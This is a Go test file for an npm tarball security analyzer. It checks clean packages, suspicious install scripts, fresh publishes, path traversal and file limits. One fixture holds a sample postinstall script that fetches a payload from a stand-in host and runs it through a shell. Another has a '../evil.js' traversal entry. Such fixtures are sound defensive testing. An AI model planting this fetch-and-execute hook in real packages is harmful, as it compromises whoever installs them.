package npmartifact

import (
	"archive/tar"
	"compress/gzip"
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/attach-dev/attach-open-score/pkg/reasons"
	"github.com/attach-dev/attach-open-score/pkg/schema"
	"github.com/attach-dev/attach-open-score/pkg/score"
)

var fixedNow = time.Date(2026, 5, 27, 6, 54, 36, 0, time.UTC)

func TestAnalyzeTarballAllowsCleanArtifact(t *testing.T) {
	path := writeTarball(t, map[string]string{
		"package/package.json": `{"name":"clean-pkg","version":"1.0.0"}`,
		"package/index.js":     `module.exports = 1;`,
	})
	result := analyze(t, path, schema.PackageIdentity{Name: "clean-pkg", Version: "1.0.0"}, nil, "")

	if len(result.Evidence) != 1 {
		t.Fatalf("evidence length = %d, want 1", len(result.Evidence))
	}
	if result.Evidence[0].Reason.Code != reasons.NoSuspiciousArtifactSignals {
		t.Fatalf("reason = %s, want %s", result.Evidence[0].Reason.Code, reasons.NoSuspiciousArtifactSignals)
	}

	verdict := evaluate(t, result)
	if verdict.Decision != schema.DecisionAllow {
		t.Fatalf("decision = %s, want ALLOW", verdict.Decision)
	}
}

func TestAnalyzeTarballFlagsSuspiciousInstallEntrypoint(t *testing.T) {
	previous := &PreviousManifest{Scripts: map[string]string{}, Dependencies: map[string]string{}}
	path := writeTarball(t, map[string]string{
		"package/package.json": `{"name":"bad-pkg","version":"1.0.0","scripts":{"postinstall":"node install.js"},"dependencies":{"plain-crypto-js":"4.2.1"}}`,
		"package/install.js":   `const cp = require("child_process"); fetch("https://example.invalid/payload").then(() => cp.execSync("sh -c ./payload"));`,
	})
	result := analyze(t, path, schema.PackageIdentity{Name: "bad-pkg", Version: "1.0.0"}, previous, "")

	assertReason(t, result.Evidence, reasons.InstallScriptPresent)
	assertReason(t, result.Evidence, reasons.SuspiciousInstallScript)
	verdict := evaluate(t, result)
	if verdict.Decision != schema.DecisionAsk {
		t.Fatalf("decision = %s, want ASK", verdict.Decision)
	}
}

func TestAnalyzeTarballFlagsFreshPublish(t *testing.T) {
	path := writeTarball(t, map[string]string{
		"package/package.json": `{"name":"fresh-pkg","version":"1.0.0"}`,
	})
	result := analyze(t, path, schema.PackageIdentity{Name: "fresh-pkg", Version: "1.0.0"}, nil, "2026-05-27T06:50:00Z")

	assertReason(t, result.Evidence, reasons.VersionTooNew)
	verdict := evaluate(t, result)
	if verdict.Decision != schema.DecisionAsk {
		t.Fatalf("decision = %s, want ASK", verdict.Decision)
	}
}

func TestAnalyzeTarballRejectsPathTraversal(t *testing.T) {
	path := writeTarball(t, map[string]string{
		"package/package.json": `{"name":"bad-path","version":"1.0.0"}`,
		"package/../evil.js":   `module.exports = 1;`,
	})
	analyzer := mustAnalyzer(t, Options{})
	_, err := analyzer.AnalyzeTarball(path, schema.PackageIdentity{Name: "bad-path", Version: "1.0.0"}, nil, "")
	if err == nil || !strings.Contains(err.Error(), "path traversal") {
		t.Fatalf("error = %v, want path traversal rejection", err)
	}
}

func TestAnalyzeTarballEnforcesFileLimit(t *testing.T) {
	path := writeTarball(t, map[string]string{
		"package/package.json": `{"name":"many-files","version":"1.0.0"}`,
		"package/a.js":         `module.exports = 1;`,
	})
	analyzer := mustAnalyzer(t, Options{MaxFiles: 1})
	_, err := analyzer.AnalyzeTarball(path, schema.PackageIdentity{Name: "many-files", Version: "1.0.0"}, nil, "")
	if err == nil || !strings.Contains(err.Error(), "max file count") {
		t.Fatalf("error = %v, want max file count rejection", err)
	}
}

func TestLoadPreviousManifest(t *testing.T) {
	path := filepath.Join(t.TempDir(), "package.json")
	if err := os.WriteFile(path, []byte(`{"scripts":{"postinstall":"node old.js"},"dependencies":{"left-pad":"1.3.0"}}`), 0o600); err != nil {
		t.Fatalf("write previous manifest: %v", err)
	}
	manifest, err := LoadPreviousManifest(path)
	if err != nil {
		t.Fatalf("LoadPreviousManifest returned error: %v", err)
	}
	if manifest.Scripts["postinstall"] != "node old.js" || manifest.Dependencies["left-pad"] != "1.3.0" {
		t.Fatalf("manifest = %#v", manifest)
	}
}

func analyze(t *testing.T, path string, pkg schema.PackageIdentity, previous *PreviousManifest, publishedAt string) Result {
	t.Helper()
	analyzer := mustAnalyzer(t, Options{})
	result, err := analyzer.AnalyzeTarball(path, pkg, previous, publishedAt)
	if err != nil {
		t.Fatalf("AnalyzeTarball returned error: %v", err)
	}
	return result
}

func mustAnalyzer(t *testing.T, options Options) Analyzer {
	t.Helper()
	options.Now = func() time.Time { return fixedNow }
	analyzer, err := NewAnalyzer(options)
	if err != nil {
		t.Fatalf("NewAnalyzer returned error: %v", err)
	}
	return analyzer
}

func evaluate(t *testing.T, result Result) schema.Verdict {
	t.Helper()
	engine, err := score.NewEngine(score.Options{Now: func() time.Time { return fixedNow }})
	if err != nil {
		t.Fatalf("NewEngine returned error: %v", err)
	}
	verdict, err := engine.Evaluate(schema.Request{Package: result.Package, Evidence: result.Evidence})
	if err != nil {
		data, _ := json.MarshalIndent(result.Evidence, "", "  ")
		t.Fatalf("Evaluate returned error: %v\n%s", err, string(data))
	}
	return verdict
}

func assertReason(t *testing.T, evidence []schema.Evidence, code string) {
	t.Helper()
	for _, item := range evidence {
		if item.Reason.Code == code {
			return
		}
	}
	t.Fatalf("reasons missing %s: %#v", code, evidence)
}

func writeTarball(t *testing.T, files map[string]string) string {
	t.Helper()
	path := filepath.Join(t.TempDir(), "pkg.tgz")
	file, err := os.Create(path)
	if err != nil {
		t.Fatalf("create tarball: %v", err)
	}
	gzipWriter := gzip.NewWriter(file)
	tarWriter := tar.NewWriter(gzipWriter)
	for name, content := range files {
		data := []byte(content)
		if err := tarWriter.WriteHeader(&tar.Header{Name: name, Mode: 0o600, Size: int64(len(data))}); err != nil {
			t.Fatalf("write tar header: %v", err)
		}
		if _, err := tarWriter.Write(data); err != nil {
			t.Fatalf("write tar body: %v", err)
		}
	}
	if err := tarWriter.Close(); err != nil {
		t.Fatalf("close tar: %v", err)
	}
	if err := gzipWriter.Close(); err != nil {
		t.Fatalf("close gzip: %v", err)
	}
	if err := file.Close(); err != nil {
		t.Fatalf("close file: %v", err)
	}
	return path
}
